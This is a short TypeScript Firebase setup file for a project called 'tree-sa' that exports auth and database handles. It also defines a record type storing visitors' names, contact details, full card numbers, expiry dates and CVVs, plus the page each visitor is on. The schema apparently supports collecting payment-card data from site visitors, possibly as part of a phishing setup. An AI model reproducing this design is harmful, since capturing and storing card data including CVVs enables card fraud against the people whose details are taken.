import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
    apiKey: "AIzaSyBTRzIOu6yN0Fiq6HGgtam6xc9MIsGKiE4",
  authDomain: "tree-sa.firebaseapp.com",
  databaseURL: "https://tree-sa-default-rtdb.firebaseio.com",
  projectId: "tree-sa",
  storageBucket: "tree-sa.firebasestorage.app",
  messagingSenderId: "1028453914907",
  appId: "1:1028453914907:web:31fd99fe3dcdb3b6fc5bbe",
  measurementId: "G-9QR56T5899"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




